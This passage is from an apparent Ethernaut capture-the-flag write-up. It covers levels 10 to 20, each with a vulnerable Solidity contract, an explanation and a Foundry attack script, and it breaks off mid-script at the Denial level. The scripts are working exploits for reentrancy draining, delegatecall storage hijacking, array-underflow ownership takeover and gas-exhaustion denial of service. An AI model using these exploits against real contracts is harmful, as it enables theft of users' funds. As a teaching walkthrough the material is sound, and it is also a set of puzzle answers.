call.\n2. One could deposit some ether to pass the require check in withdraw and and call the withdraw from a contract in which a fallback function is implemented in such a way that it is re entered into withdraw again.\n3. So, we will donate some ether to the contract and then call withdraw from a contract.\n4. The withdraw call send our ether back and invokes the fallback or receive function of our contract.\n5. We can call the `withdraw()` function again from the fallback function to reenter again into `Reentrance` contract.\n6. Still we can manage to pass require check as our balance wasn’t updated yet.\n7. We need to check the balance of the `Reentrance` contract before reentering because when we call the withdraw again after the balance of `Reentrance` becomes zero will revert the entire transaction.\n\n**Level10Solution.s.sol**\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.6.12;\n\nimport \"../src/Level10.sol\";\nimport \"forge-std/Script.sol\";\nimport \"forge-std/console.sol\";\n\ncontract Attack{\n\n    Reentrance public r_instance =Reentrance(0x1e5f76396a5b433c9c462c919dAf64Eed6bD4926);\n\n    function exploit() external payable{\n\n        r_instance.donate{value: 0.001 ether}(address(this));\n        r_instance.withdraw(0.001 ether);\n    }\n    receive() external payable{\n        if(address(r_instance).balance \u003e= 0.001 ether){\n             r_instance.withdraw(0.001 ether);\n        }\n    }\n}\n\ncontract Level10Sol is Script{\n    function run() external {\n            vm.startBroadcast(vm.envUint(\"PRIVATE_KEY\"));\n            new Attack().exploit{value: 0.001 ether}();\n            vm.stopBroadcast();\n    }\n}\n```\n\n**To run the script**\n\n```\n$ source .env\n$ forge script script/Level10Solution.s.sol:Level10Sol --rpc-url $RPC_URL --broadcast\n```\n\n## Elevator\n\n**Level11.sol**\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\ninterface Building {\n  function isLastFloor(uint) external returns (bool);\n}\n\ncontract Elevator {\n  bool public top;\n  uint public floor;\n\n  function goTo(uint _floor) public {\n    Building building = Building(msg.sender);\n\n    if (! building.isLastFloor(_floor)) {\n      floor = _floor;\n      top = building.isLastFloor(floor);\n    }\n  }\n}\n```\n\n**Goal:**\n\nWe need to get to the top floor, i.e make the top boolean to `true`.\n\n**Explanation:**\n\n1. The Elevator calling the `isLastFloor()` function on `msg.sender` which is insecure. Dont trust the unknown libraries or contract while making the calls.\n2. The `top` variable is being updated upon the return value of the `isLastFloor()` function.\n3. But, To pass the `if` condition the `isLastFloor()` should return the `false`. But the `top` will become `false` only if it results false everytime.\n4. We can observe that the `isLastFloor()` function is being called twice. So, we can write a contract which implements `isLastFloor()` function in such a way that is returns `false` on first call and `true` on second call.\n5. So, that the `if` condition satisfies and `top` will be updated to true.\n\n**Level11Solution.s.sol**\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\nimport \"../src/Level11.sol\";\nimport \"forge-std/Script.sol\";\nimport \"forge-std/console.sol\";\n\ncontract Level11Sol is Script{\n     Elevator public instance = Elevator(0x8Ad804B2A6907983267C2ef6A962d50F5C63A694);\n    function run() external{\n        vm.startBroadcast(vm.envUint(\"PRIVATE_KEY\"));\n         new Attack().exploit();\n        vm.stopBroadcast();\n    }\n}\ncontract Attack{\n    Elevator public instance = Elevator(0x8Ad804B2A6907983267C2ef6A962d50F5C63A694);\n    uint public floor;\n    function exploit() external{\n        instance.goTo(3);\n    }\n    function isLastFloor(uint _floor)external returns(bool){\n        if(floor == _floor){\n            return true;\n        }\n         floor = _floor;\n        return false;\n    }\n}\n```\n\n**To run the script**\n\n```\n$ source .env\n$ forge script script/Level11Solution.s.sol:Level11Sol --rpc-url $RPC_URL --broadcast\n```\n\n## Privacy\n\n**Level12.sol**\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\ncontract Privacy {\n\n  bool public locked = true;\n  uint256 public ID = block.timestamp;\n  uint8 private flattening = 10;\n  uint8 private denomination = 255;\n  uint16 private awkwardness = uint16(block.timestamp);\n  bytes32[3] private data;\n\n  constructor(bytes32[3] memory _data) {\n    data = _data;\n  }\n\n  function unlock(bytes16 _key) public {\n    require(_key == bytes16(data[2]));\n    locked = false;\n  }\n\n  /*\n    A bunch of super advanced solidity algorithms...\n\n      ,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`\n      .,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,\n      *.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^         ,---/V      `*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.    ~|__(o.o)\n      ^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'  UU  UU\n  */\n}\n\n```\n\n**Goal:**\n\nWe need to unlock the contract, i.e call `unlock()` function with right password.\n\n**Explanation:**\n\n1. This challenge is similar to `Vault`. But we need to understand the storage layout of this contract and query the exact passwor storage slot of the contract.\n2. The storage layout of contract as follows :\n\n   ```solidity\n   `bool public locked = true;                                  // slot 0\n   uint256 public ID = block.timestamp;                        // slot 1\n   uint8 private flattening = 10;                              // slot 2\n   uint8 private denomination = 255;                           // slot 2\n   uint16 private awkwardness = uint16(block.timestamp);       // slot 2\n   bytes32[3] private data;  // data[0] =\u003e slot 3`\n                             // data[1] =\u003e slot 4'\n                             // data[2] =\u003e slot 5`\n   ```\n\n3. Password is the lower 16 bytes of the `data[2]`, i.e `require(_key == bytes16(data[2]));`\n4. Since the `data[2]` stored at slot 5, we can query it with `vm.load` cheatcode.\n5. Calling unlock with this password will solve the challenge.\n\n**Level12Solution.s.sol**\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\nimport \"../src/Level12.sol\";\nimport \"forge-std/Script.sol\";\nimport \"forge-std/console.sol\";\n\ncontract Level12Sol is Script{\n\n    Privacy public instance = Privacy(0x80AeDd671Abb04118998A8baAd7B879aA53756f9) ;\n\n    function run() external {\n        vm.startBroadcast(vm.envUint(\"PRIVATE_KEY\"));\n\n        bytes32 slot5_data = vm.load(address(instance),bytes32(uint256(5)));\n        instance.unlock(bytes16(slot5_data));\n\n        vm.stopBroadcast();\n    }\n}\n```\n\n**To run the script**\n\n```\n$ source .env\n$ forge script script/Level12Solution.s.sol:Level12Sol --rpc-url $RPC_URL --broadcast\n```\n\n## Gatekeeper One\n\n**Level13.sol**\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\ncontract GatekeeperOne {\n\n  address public entrant;\n\n  modifier gateOne() {\n    require(msg.sender != tx.origin);\n    _;\n  }\n\n  modifier gateTwo() {\n    require(gasleft() % 8191 == 0);\n    _;\n  }\n\n  modifier gateThree(bytes8 _gateKey) {\n      require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), \"GatekeeperOne: invalid gateThree part one\");\n      require(uint32(uint64(_gateKey)) != uint64(_gateKey), \"GatekeeperOne: invalid gateThree part two\");\n      require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), \"GatekeeperOne: invalid gateThree part three\");\n    _;\n  }\n\n  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {\n    entrant = tx.origin;\n    return true;\n  }\n}\n```\n\n**Goal:**\n\nMake it past the gatekeeper and register as an entrant to pass this level.\n\n**Explanation:**\n\n1. We have to call the `enter()` function, without being revert by modifier checks.\n2. We need to pass three modifier checks. We can simply pass `gateOne()` by calling it from another contract.\n3. To bypass `gateTwo()` we need to send exact `gas` that should result the modulo 8191 to zero.\n4. `gasLeft()` is a method which calculates the remaining gas after executing instructions before it invoked.\n5. We can pass the amount of gas to be transferred to the external call. But we need to send exact amount of gas.\n6. One thing that we can do is bruteforce. By randomly bruteforcing with different values of gas, we can pass this modifier check.\n7. To pass the `gateThree()` we need to some calculations. It takes the `_gateKey` a bytes8 value as argument.\n8. The modifiers checks the lower 32 bits of the gatekey after converting to uint64.\n9. So, we can calculate the lower 16 bits of the `tx.orgin` and pad it with zeros to pass the gatThree and gateOne.\n10. Two pass the gateTwo we can add random bits to the MSB position.\n\n**Level13Solution.s.sol**\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\nimport \"../src/Level13.sol\";\nimport \"forge-std/Script.sol\";\nimport \"forge-std/console.sol\";\n\ncontract Attack {\n    GatekeeperOne public instance =\n        GatekeeperOne(0xd216C1041909516Dd89a471ECdb96aB3E7ae4Abd);\n\n    function exploit() external {\n        bytes8 gateKey = bytes8(uint64(uint160(tx.origin))) \u0026\n            0xFFFFFFFF0000FFFF;\n        for (uint256 i = 0; i \u003c 300; i++) {\n            uint256 totalgas = i + (8191 * 3);\n            (bool success, ) = address(instance).call{gas: totalgas}(\n                abi.encodeWithSignature(\"enter(bytes8)\", gateKey)\n            );\n            if (success) {\n                break;\n            }\n        }\n    }\n}\n\ncontract Level13Sol is Script {\n    GatekeeperOne public instance =\n        GatekeeperOne(0xd216C1041909516Dd89a471ECdb96aB3E7ae4Abd);\n    function run() external {\n        vm.startBroadcast(vm.envUint(\"PRIVATE_KEY\"));\n\n        new Attack().exploit();\n\n        vm.stopBroadcast();\n    }\n}\n\n```\n\n**To run the script**\n\n```\n$ source .env\n$ forge script script/Level13Solution.s.sol:Level13Sol --rpc-url $RPC_URL --broadcast\n```\n\n## Gatekeeper Two\n\n**Level14.sol**\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\ncontract GatekeeperTwo {\n\n  address public entrant;\n\n  modifier gateOne() {\n    require(msg.sender != tx.origin);\n    _;\n  }\n\n  modifier gateTwo() {\n    uint x;\n    assembly { x := extcodesize(caller()) }\n    require(x == 0);\n    _;\n  }\n\n  modifier gateThree(bytes8 _gateKey) {\n    require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == type(uint64).max);\n    _;\n  }\n\n  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {\n    entrant = tx.origin;\n    return true;\n  }\n}\n```\n\n**Goal:**\n\nThis gatekeeper introduces a few new challenges. Register as an entrant to pass this level\n\n**Explanation:**\n\n1. Similiar to gatekeeper one, to pass `gateOne()` here we need to call from a contract.\n2. `gateTwo()` checks that the caller contract code should zero.\n3. Code inside contract constructor won’t be stored on blockchain. So, we can call the `enter()` from our attack contract constructor.\n4. To pass the `gateThree()` we need to do simple XOR operation. To get the `gateKey()` we need to do `uint64(bytes8(keccak256(abi.encodePacked(msg.sender))))` XOR `type(uint64).max`.\n\n```\nWe know that\n\n//If x ^ y = z then x ^ z = y\n```\n\nLevel14Solution.s.sol\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\nimport \"../src/Level14.sol\";\nimport \"forge-std/Script.sol\";\nimport \"forge-std/console.sol\";\n\ncontract Attack{\n    constructor(){\n        GatekeeperTwo  instance = GatekeeperTwo(0xc3FB4c38f398050206ea0D07D18D693Bc75888AA) ;\n        bytes8 gateKey = bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ type(uint64).max);\n        instance.enter(gateKey);\n    }\n}\ncontract Level14Sol is Script{\n    function run() external{\n        vm.startBroadcast(vm.envUint(\"PRIVATE_KEY\"));\n        new Attack();\n        vm.stopBroadcast();\n    }\n}\n\n```\n\n**To run the script**\n\n```\n$ source .env\n$ forge script script/Level14Solution.s.sol:Level14Sol --rpc-url $RPC_URL --broadcast\n```\n\n## Naught Coin\n\n**Level15.sol**\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\nimport 'openzeppelin-contracts/contracts/token/ERC20/ERC20.sol';\n\n contract NaughtCoin is ERC20 {\n\n  // string public constant name = 'NaughtCoin';\n  // string public constant symbol = '0x0';\n  // uint public constant decimals = 18;\n  uint public timeLock = block.timestamp + 10 * 365 days;\n  uint256 public INITIAL_SUPPLY;\n  address public player;\n\n  constructor(address _player)\n  ERC20('NaughtCoin', '0x0') {\n    player = _player;\n    INITIAL_SUPPLY = 1000000 * (10**uint256(decimals()));\n    // _totalSupply = INITIAL_SUPPLY;\n    // _balances[player] = INITIAL_SUPPLY;\n    _mint(player, INITIAL_SUPPLY);\n    emit Transfer(address(0), player, INITIAL_SUPPLY);\n  }\n\n  function transfer(address _to, uint256 _value) override public lockTokens returns(bool) {\n    super.transfer(_to, _value);\n  }\n\n  // Prevent the initial owner from transferring tokens until the timelock has passed\n  modifier lockTokens() {\n    if (msg.sender == player) {\n      require(block.timestamp \u003e timeLock);\n      _;\n    } else {\n     _;\n    }\n  }\n}\n```\n\n**Goal:**\n\nNaughtCoin is an ERC20 token and you’re already holding all of them. The catch is that you’ll only be able to transfer them after a 10 year lockout period. Can you figure out how to get them out to another address so that you can transfer them freely? Complete this level by getting your token balance to 0.\n\n**Explanation:**\n\n1. NaughtCoin imports ERC20 contract. So, it consists of all the function of ERC20 contract also.\n2. NaughtCoin only implemented the `lockTokens()` modifier on `transfer()` function only.\n3. There are other ways to transfer tokens from one address to other without using `transfer()`\n4. Player can approve the allowances of their tokens to someone, and they can use `transferFrom()` function to transfer tokens on behalf of player.\n\n**Level15Solution.s.sol**\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\nimport \"../src/Level15.sol\";\nimport \"forge-std/Script.sol\";\nimport \"forge-std/console.sol\";\n\ncontract Attack {\n    NaughtCoin public instance =\n        NaughtCoin(0x4850cbcf544F3055b6269C54C5e9bD1Ec0905EE2);\n    function exploit(address _player) public {\n        require(instance.allowance(_player, address(this))    \u003e 0, \"Not approved\");\n        require(\n            instance.transferFrom(\n                _player,\n                address(this),\n                instance.balanceOf(_player)\n            ),\n            \"Transfer to attacker failed\"\n        );\n    }\n}\n\ncontract Level15Sol is Script {\n    NaughtCoin public instance =\n        NaughtCoin(0x4850cbcf544F3055b6269C54C5e9bD1Ec0905EE2);\n    function run() external {\n        vm.startBroadcast(vm.envUint(\"PRIVATE_KEY\"));\n\n        address player = address(instance.player());\n        uint playerBalance = instance.balanceOf(player);\n        Attack attack = new Attack();\n        instance.approve(address(attack), playerBalance); //approving attack contract and balance\n        attack.exploit(player);\n\n        vm.stopBroadcast();\n    }\n}\n\n```\n\n**To run the script**\n\n```\n$ source .env\n$ forge script script/Level15Solution.s.sol:Level15Sol --rpc-url $RPC_URL --broadcast\n```\n\n## Preservation\n\n**Level16.sol**\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\ncontract Preservation {\n\n  // public library contracts\n  address public timeZone1Library;\n  address public timeZone2Library;\n  address public owner;\n  uint storedTime;\n  // Sets the function signature for delegatecall\n  bytes4 constant setTimeSignature = bytes4(keccak256(\"setTime(uint256)\"));\n\n  constructor(address _timeZone1LibraryAddress, address _timeZone2LibraryAddress) {\n    timeZone1Library = _timeZone1LibraryAddress;\n    timeZone2Library = _timeZone2LibraryAddress;\n    owner = msg.sender;\n  }\n\n  // set the time for timezone 1\n  function setFirstTime(uint _timeStamp) public {\n    timeZone1Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));\n  }\n\n  // set the time for timezone 2\n  function setSecondTime(uint _timeStamp) public {\n    timeZone2Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));\n  }\n}\n\n// Simple library contract to set the time\ncontract LibraryContract {\n\n  // stores a timestamp\n  uint storedTime;\n\n  function setTime(uint _time) public {\n    storedTime = _time;\n  }\n}\n```\n\n**Goal:**\nThe goal of this level is for you to claim ownership of the instance you are given.\n\n**Explanation:**\n\n1. Preservation contract uses LibraryContract to set the time in the Preservation contract by using `delegatecall`.\n2. So, the caller and callee contract storage layout should be matched. If not it may result in storage collision bugs.\n3. Here the Preservation contract doesn’t matches the LibraryContract storage layout.\n4. I observed that calling `setSecondTime` updates the `timeZone1Library` address in the Preservation contract.\n5. By exploiting this we can write our own attacker contract that implements the `setTime()` function and pass that address to the `setSecondTime()` function so that it will updte the `timeZone1Library` address in the Preservation contract.\n6. I implemented the Attack contract in such a way that it matches the Preservation storage layout and instead of updating the `storedTime`, i updated the `owner`. And that makes our attack contract as the owner of the Preservation contract.\n\n**Level16Solution.s.sol**\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\nimport \"../src/Level16.sol\";\nimport \"forge-std/Script.sol\";\nimport \"forge-std/console.sol\";\n\ncontract Attack{\n\n      address public timeZone1Library;\n      address public timeZone2Library;\n      address public owner;\n\n    function exploit () external{\n          Preservation instance = Preservation(0xA1979400E9bbCEcd6B13aA814281A6B95866A077);\n        //updating the timeZone1Library with attack contract address\n          instance.setFirstTime(uint(uint160(address(this))));\n          /*\n          when we call  the setFirstTime f'n again ,\n          it delegatecall to the attack contract and then results in changing the owner to msg.sender\n           */\n          instance.setFirstTime(uint(uint160(msg.sender)));\n    }\n    function setTime(uint _owner) external{\n          owner = address(uint160(_owner));\n    }\n    }\n\ncontract Level16Sol is Script{\n      function run() external{\n            Preservation preservation = Preservation(0xA1979400E9bbCEcd6B13aA814281A6B95866A077);\n            vm.startBroadcast(vm.envUint(\"PRIVATE_KEY\"));\n            Attack attack = new Attack();\n            attack.exploit();\n            vm.stopBroadcast();\n    }\n}\n```\n\n**To run the script**\n\n```\n$ source .env\n$ forge script script/Level16Solution.s.sol:Level16Sol --rpc-url $RPC_URL --broadcast\n```\n\n## Recovery\n\n**Level17.sol**\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\ncontract Recovery {\n\n  //generate tokens\n  function generateToken(string memory _name, uint256 _initialSupply) public {\n    new SimpleToken(_name, msg.sender, _initialSupply);\n\n  }\n}\n\ncontract SimpleToken {\n\n  string public name;\n  mapping (address =\u003e uint) public balances;\n\n  // constructor\n  constructor(string memory _name, address _creator, uint256 _initialSupply) {\n    name = _name;\n    balances[_creator] = _initialSupply;\n  }\n\n  // collect ether in return for tokens\n  receive() external payable {\n    balances[msg.sender] = msg.value * 10;\n  }\n\n  // allow transfers of tokens\n  function transfer(address _to, uint _amount) public {\n    require(balances[msg.sender] \u003e= _amount);\n    balances[msg.sender] = balances[msg.sender] - _amount;\n    balances[_to] = _amount;\n  }\n\n  // clean up after ourselves\n  function destroy(address payable _to) public {\n    selfdestruct(_to);\n  }\n}\n```\n\n**Goal:**\n\nThis level will be completed if you can recover (or remove) the 0.001 ether from the lost contract address.\n\n**Explanation:**\n\n1. The SimpleToken contract is funded with 0.001 ether. We need to drain those ether.\n2. To drain ether we can simply call the `destroy()` function of the SimpleToken contract.\n3. But we dont have the address of the SimpleToken. We can user ETHERSCAN to identify the transaction of Recovery contract to find the address of the SimpleToken.\n4. We can also use a formula that is mentioned in ethereum yellow paper about how a newly created contract address will be computed.\n5. The formula is `address(uint160(uint256(keccak256(abi.encodePacked(bytes1(0xd6), bytes1(0x94), address(_creator), bytes1(0x01))))))`\n6. `0xd6` and `0x94` are constants and the last byte1 is the nonce, i.e, number contracts created from the existed contract. We assume that its one.\n7. By this formula we can recover the SimpleToken address and call the `destroy()` function to drain all ether.\n\n**Level17Solution.s.sol**\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\nimport \"forge-std/Script.sol\";\nimport \"forge-std/console.sol\";\nimport {Recovery} from \"../src/Level17.sol\";\n\ncontract Level17Sol is Script{\n    Recovery public recovery = Recovery(0x7b9D82e39aa30ddAf4c5a9f132F4834926107Caf);\n    function run() external{\n        vm.startBroadcast(vm.envUint(\"PRIVATE_KEY\"));\n        address myAddress = address(vm.envAddress(\"MY_ADDRESS\"));\n        Attack attack = new Attack();\n        console.log(\"Attack Address : \", address(attack));\n        console.log(\"MY Balance : \", myAddress.balance);\n\n        address _creator = address(recovery);\n\n        address token = attack.exploit(_creator, payable(myAddress));\n\n        console.log(\"Token Address : \", token);\n        console.log(\"MY Balance : \", myAddress.balance);\n\n        vm.stopBroadcast();\n    }\n}\n\ncontract Attack{\n    function exploit(address _creator, address payable _myAddress) public returns(address){\n        address missedToken = address(uint160(uint256(keccak256(abi.encodePacked(bytes1(0xd6), bytes1(0x94), address(_creator), bytes1(0x01))))));\n\n        missedToken.call(abi.encodeWithSignature(\"destroy(address)\", _myAddress));\n\n        return missedToken;\n    }\n}\n```\n\n**To run the script**\n\n```\n$ source .env\n$ forge script script/Level17Solution.s.sol:Level17Sol --rpc-url $RPC_URL --broadcast\n\n```\n\n## Magic Number\n\n**Level18.sol**\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\ncontract MagicNum {\n\n  address public solver;\n\n  constructor() {}\n\n  function setSolver(address _solver) public {\n    solver = _solver;\n  }\n\n  /*\n    ____________/\\_______/\\\\\\\\_____\n     __________/\\\\_____/\\///////\\___\n      ________/\\/\\____///______//\\__\n       ______/\\//\\______________/\\/___\n        ____/\\/__/\\___________/\\//_____\n         __/\\\\\\\\\\\\\\\\_____/\\//________\n          _///////////\\//____/\\/___________\n           ___________/\\_____/\\\\\\\\\\\\\\_\n            ___________///_____///////////////__\n  */\n}\n```\n\n**Goal:**\n\nTo solve this level, you only need to provide the Ethernaut with a Solver, a contract that responds to whatIsTheMeaningOfLife() with the right number. But the solver contract should be very small at most 10 OPCODES.\n\n**Explanation:**\n\n1. To solve this challenge we need to write a contract that return 42. But the contract should be written with at most 10 OPCODES.\n2. We need write our contract in Assembly not in solidity, so that we can build very tiny contract with less OPCODES.\n3. Then we can convert it into bytecode and deploy onto blockchain and then pass the address to the `setSolver()` function.\n4. Bytecodes are divided into two main types in solidity.\n   1. Runtime bytecode\n   2. Creation bytecode\n5. **Runtime bytecode** will be stored on blockchain and executes when a call happens\n6. **Creation code** consist of **init data**, **runtime data** and **constructor bytecode**. We need to create a runtime code which returns 42 upon call and append it with some init data which is required to deploy a contract.\n7. We can use this creation code to deploy a contract using `create` opcode and pass the address of the deployed contract to `setSolver()`.\n\n```\nOPCODE   |    NAME\n---------|---------\n 0x60    |    PUSH1\n 0x69    |    PUSH10\n 0x52    |    MSTORE\n 0xf3    |    RETURN\n\nRuntime Opcode Creation:\n\nPUSH1 0x2a (602a) - Pushing 42(0x2a) into the stack. Value(v) parameter to MSTORE.\nPUSH1 0x00 (6000) - Pushing 0x00 into the stack. Position(p) parameter to MSTORE.\nMSTORE     (52)   - Store value (0x2a) at position 0x00 in memory.\nPUSH1 0x20 (6020) - Pushing 32 bytes into the stack. Size(s) parameter to RETURN.\nPUSH1 0x00 (6000) - Pushing 0x00 into the stack. Position(p) parameter to RETURN.\nRETURN     (f3)   - Returning value of size (32 bytes) from position (0x00).\n\nConcatenating these opcodes gives the runtime bytecode as 602a60005260206000f3.\n\n\nInitialization Opcode Creation:\n\nPUSH10 0x602a60005260206000f3 (69602a60005260206000f3) - Pushing runtime bytecode into the stack.\n                                                         Value(v) parameter to MSTORE.\n\nPUSH1 0x00 (6000)                                      - Pushing 0x00 into the stack.\n                                                         Position(p) parameter to MSTORE.\n\nMSTORE (52)                                            - Stores runtime bytecode at\n                                                         position 0x00 into memory.\n\n\nPUSH1 0x0a (600a)                                      - Pushing 10 (length of the runtime code)\n                                                         into the stack. Size(s) parameter to RETURN.\n\nPUSH1 0x16 (6016)                                      - Pushing 22 (offset position) into the stack.\n                                                         Position(p) parameter to RETURN.\n\n\nRETURN (f3)                                            - Returning value of size (10 bytes)\n                                                         from position (22).\n\nConcatenating these opcodes gives the initialization code as 69602a60005260206000f3600052600a6016f3.\n\n```\n\n**Level18Solution.s.sol**\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\nimport \"forge-std/Script.sol\";\nimport \"forge-std/console.sol\";\nimport {MagicNum} from \"../src/Level18.sol\";\n\ncontract Level18Sol is Script{\n    MagicNum public magicNum = MagicNum(0xD5cf766bc937340767d9cf5Fd89eF1C14b78BF9B);\n    function run() external{\n        vm.startBroadcast(vm.envUint(\"PRIVATE_KEY\"));\n        new Attack().exploit();\n        vm.stopBroadcast();\n\n    }\n}\ncontract Attack{\n    MagicNum public magicNum = MagicNum(0xD5cf766bc937340767d9cf5Fd89eF1C14b78BF9B);\n    function exploit() public{\n        bytes memory bytecode = hex\"69602a60005260206000f3600052600a6016f3\";\n        address _solver;\n          // create(value, offset, size)\n        assembly{\n            _solver:= create(0,add(bytecode,0x20),0x13)\n        }\n        require(_solver != address(0));\n        magicNum.setSolver(_solver);\n    }\n}\n```\n\n**To run the script**\n\n```\n$ source .env\n$ forge script script/Level18Solution.s.sol:Level18Sol --rpc-url $RPC_URL --broadcast\n```\n\n## Alien Codex\n\n**Level19.sol**\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.5.0;\n\nimport './helpers/Ownable-05.sol';\n\ncontract AlienCodex is Ownable {\n\n  bool public contact;\n  bytes32[] public codex;\n\n  modifier contacted() {\n    assert(contact);\n    _;\n  }\n\n  function makeContact() public {\n    contact = true;\n  }\n\n  function record(bytes32 _content) contacted public {\n    codex.push(_content);\n  }\n\n  function retract() contacted public {\n    codex.length--;\n  }\n\n  function revise(uint i, bytes32 _content) contacted public {\n    codex[i] = _content;\n  }\n}\n```\n\n**Goal:**\n\nClaim ownership to complete the level.\n\n**Explanation:**\n\n1. When we see the solidity version, it is 0.5.0 and it is prone to integer overflow/underflow.\n2. To call any function on the contract we need to call the `makeContact()` function initially.\n3. AlineCodex inherits the Ownable contract which has the state variable `owner`. It will be stored at slot 0 combined with `contact` boolean variable.\n4. Here, in the slot 1 the legth of the `codex` array will be stored and it will be updated whenever a new element is pushed onto the array.\n5. `AleinCodex` also changes the length of the `codex` with `retract()` function.\n6. `revise()` function allows us to modify any existing element of the `codex` array. Keep in mind that each element will stored at different storage slot.\n7. Initially the length of the `codex` is 0. If we call the `retract()` it will be `0 - 1` which results in underflow and stores the value  **`2^256 - 1`** as the length.\n8. So, now the codex array has access to all the storage slots of the contract. We can use this to update the `owner` value which is stored at the slot 0.\n9. The codex array elements starts from the slot (keccak256(1)).\n10. We need to pass the index\n    `2^256 - 1 - unit(keccack256(1)) + 1` to the `revise()` function for accessing the slot 0.\n11. Pass our address in the `revise()` function along with the index. Then we will become the owner.\n\n```\n\n| Slot Number          | Variables                                                                                          |\n|----------------------|----------------------------------------------------------------------------------------------------|\n| 0                    | - bool public contact\u003cbr\u003e- address private _owner\u003cbr\u003e- codex[2^256 - 1 - uint(keccak256(1))] + 1 (Access to slot 0)  |\n| 1                    | - codex.length (Number of elements in the dynamic array)                                            |\n| keccak256(1)         | - codex[0] (Array's first element)                                                                 |\n| keccak256(1) + 1     | - codex[1] (Array's second element)                                                                |\n| ...                  | ...                                                                                                |\n| ...                  | ...                                                                                                |\n| ...                  | ...                                                                                                |\n| 2^256 - 1            | - codex[2^256 - 1 - uint(keccak256(1))] (Array's last element)                                      |\n| 0                    | - codex[2^256 - 1 - uint(keccak256(1))] + 1 (got access to slot 0)                                  |\n\n```\n\n**Level19Solution.s.sol**\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\nimport \"forge-std/Script.sol\";\nimport \"forge-std/console.sol\";\n\ninterface IAlienCodex{\n\n    function makeContact() external;\n    function record(bytes32 _content) external;\n    function retract() external;\n    function revise(uint i, bytes32 _content) external;\n\n}\n\ncontract Level19Sol is Script{\n    IAlienCodex public instance = IAlienCodex(0xe5EC55D210Edd23dBB7d055E9ed63DAA8E35e493);\n    function run() external{\n    vm.startBroadcast(vm.envUint(\"PRIVATE_KEY\"));\n\n\n\n    uint index = ((2 ** 256) - 1) - uint(keccak256(abi.encode(1))) + 1;\n    bytes32 myAddress =  bytes32(uint256(uint160(vm.envUint(\"MY_ADDRESS\"))));\n\n    instance.makeContact();\n    instance.retract();\n    instance.revise(index,myAddress);\n\n    bytes32 newOwner = vm.load(address(instance),bytes32(uint(0)));\n\n    console.logBytes32(newOwner);\n\n    vm.stopBroadcast();\n\n    }\n}\n```\n\n**To run the script**\n\n```\n$ source .env\n$ forge script script/Level19Solution.s.sol:Level19Sol --rpc-url $RPC_URL --broadcast\n```\n\n## Denial\n\n**Level20.sol**\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\ncontract Denial {\n\n    address public partner; // withdrawal partner - pay the gas, split the withdraw\n    address public constant owner = address(0xA9E);\n    uint timeLastWithdrawn;\n    mapping(address =\u003e uint) withdrawPartnerBalances; // keep track of partners balances\n\n    function setWithdrawPartner(address _partner) public {\n        partner = _partner;\n    }\n\n    // withdraw 1% to recipient and 1% to owner\n    function withdraw() public {\n        uint amountToSend = address(this).balance / 100;\n        // perform a call without checking return\n        // The recipient can revert, the owner will still get their share\n        partner.call{value:amountToSend}(\"\");\n        payable(owner).transfer(amountToSend);\n        // keep track of last withdrawal time\n        timeLastWithdrawn = block.timestamp;\n        withdrawPartnerBalances[partner] +=  amountToSend;\n    }\n\n    // allow deposit of funds\n    receive() external payable {}\n\n    // convenience function\n    function contractBalance() public view returns (uint) {\n        return address(this).balance;\n    }\n}\n```\n\n**Goal:**\n\nDeny the owner from withdrawing funds when they call withdraw() (whilst the contract still has funds, and the transaction is of 1M gas or less) you will win this level.\n\n**Explanation:**\n\n1. We should revert the call when the owner calls the `withdraw()` function. But if we do a simple revert in our contract fallback it won’t work.\n2. Because withdraw function doesn’t check for the return value.\n3. One thing we can do is, drain the gas of the transaction that is sent by the owner.\n4. Call to partner is made by the `call` which will forward all the remaining gas to the external call.\n5. So, we can drain all the gas by writing a most expensive computation in Partner contract.\n6. I have written an infinite loop inside the fallback of the Attack contract and registered the Attack contract as the partner in Denial contract\n\n**Level20Solution.s.sol**\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\nimport \"forge-std/Script.sol\";\nimport \"forge-std/console.sol\";\nimport {Denial} from \"../src/Level20.sol\";\n\ncontract Level20Sol is Script{\n    Denial public instance = 